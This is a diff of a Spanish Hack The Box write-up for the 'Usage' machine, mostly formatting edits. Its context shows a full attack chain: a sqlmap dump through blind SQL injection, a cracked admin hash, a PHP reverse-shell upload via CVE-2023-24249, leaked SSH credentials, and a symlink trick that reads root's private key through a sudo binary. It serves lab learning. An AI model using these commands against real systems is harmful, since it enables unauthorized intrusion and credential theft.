@@ -21,6 +21,9 @@ tags:
   - ssh
   - http
   - tcp
+  - symlink abuse
+  - sudo abuse
+  - php
   - information gathering
   - web analysis
   - vulnerability exploitation
@@ -63,7 +66,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![](/assets/img/htb-writeup-usage/usage1_3.png)
 ![](/assets/img/htb-writeup-usage/usage2.png)
 
-Luego de unas pruebas, encuentro que la direccion '/forget-password' es vulnerable a SQL injection Blind.
+Luego de unas pruebas, encuentro que la direccion `/forget-password` es vulnerable a SQL injection Blind.
 
 ![](/assets/img/htb-writeup-usage/usage3_1.png)
 
@@ -74,7 +77,7 @@ Utilizo Sqlmap para enumerar la base de datos.
 ```
 ![](/assets/img/htb-writeup-usage/usage3_2.png)
 
-Y logro encontrar un hash que le pertenece al usuario 'administrator'.
+Y logro encontrar un hash que le pertenece al usuario `administrator`.
 
 ```terminal
 /home/kali/Documents/htb/machines/usage:-$ sudo sqlmap -r request4.txt  -p email --dbms=mysql --level=3 --risk=3 --technique=BUT -v 7 --batch -D usage_blog -T admin_users --dump --threads 3
@@ -101,14 +104,12 @@ Table: admin_users
 $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
 ```
 
-Consigo logearme como administrador. 
+Consigo logearme como `administrador`. 
 
 ---
 ## CVE Exploitation
 
-Analizando la pagina encuentro que la version de laravel es vulnerable, CVE-2023-24249.
-
-<https://nvd.nist.gov/vuln/detail/CVE-2023-24249>
+Analizando la pagina encuentro que la version de laravel es vulnerable, [CVE-2023-24249](https://nvd.nist.gov/vuln/detail/CVE-2023-24249).
 
 Por tanto puedo insertar una reverse shell.
 
@@ -118,13 +119,13 @@ Por tanto puedo insertar una reverse shell.
 
 Solo permite subir un archivo de imagen a la web. Por lo que los pasos a seguir, son:
 
-* Cambiar la extencion de la reverse shell de .php a .jpg
+* Cambiar la extencion de la reverse shell de `.php` a `.jpg`.
 
 * Me pongo a la escucha con Netcat por dos puertos distintos (la conexion por la shell no durara mucho tiempo, por lo que tengo que establecer otra conexion por un puerto distinto).
 
-* Subo la shell e intercepto la peticion 'POST' con Burp Suite, para cambiar manualmente la extenccion a .php.
+* Subo la shell e intercepto la peticion `POST` con Burp Suite, para cambiar manualmente la extenccion a `.php`.
 
-* Devuelvo la peticion manipulada y navego donde esta alojada la shell 'http://admin.usage.htb/uploads/img/injection.php' para ejecutarla.
+* Devuelvo la peticion manipulada y navego donde esta alojada la shell `http://admin.usage.htb/uploads/img/injection.php` para ejecutarla.
 
 * Finalmente recibo la conexion por el puerto 1234 y rapidamente creo una nueva conexion mas estable por el puerto 4444.
 
@@ -146,7 +147,7 @@ dash@usage:~$ cat user.txt
 
 ![](/assets/img/htb-writeup-usage/usage5.png)
 
-En el archivo '.monitrc' encuentro credenciales para el usuario 'xander'
+En el archivo `.monitrc` encuentro credenciales para el usuario `xander`
 
 ```terminal
 dash@usage:~$ cat .monitrc
@@ -158,7 +159,7 @@ dash@usage:~$ cat .monitrc
 /home/kali/Documents/htb/machines/usage:-$ ssh xander@10.10.11.18
 xander@10.10.11.18's password: 3nc0d3d_pa$$w0rd
 ```
-El usario 'xander' puede ejecutar el comando '/usr/bin/usage_management' como 'sudo'.
+El usario `xander` puede ejecutar el comando `/usr/bin/usage_management` como sudo.
 
 ```terminal
 xander@usage:~$ sudo -l
@@ -174,12 +175,12 @@ xander@usage:~$ sudo /usr/bin/usage_management
 	3. Reset admin password
 	Enter your choice (1/2/3): 1
 ```
-Me muevo al directorio '/var/www/html' y creo un archivo vacio llamado '@id_rsa'
+Me muevo al directorio `/var/www/html` y creo un archivo vacio llamado `@id_rsa`
 
 ```terminal
 xander@usage:/var/www/html$ touch @id_rsa
 ```
-Con 'id_rsa' creo un enlace simbólico en el directorio actual que apunta al archivo '/root/.ssh/id_rsa'. Esto significa que cualquier acceso al archivo 'id_rsa' en '/var/www/html' se redirige al archivo real ubicado en '/root/.ssh/id_rsa'.
+Con `id_rsa` creo un enlace simbólico en el directorio actual que apunta al archivo `/root/.ssh/id_rsa`. Esto significa que cualquier acceso al archivo `id_rsa` en `/var/www/html` se redirige al archivo real ubicado en `/root/.ssh/id_rsa`.
 
 ```terminal
 xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
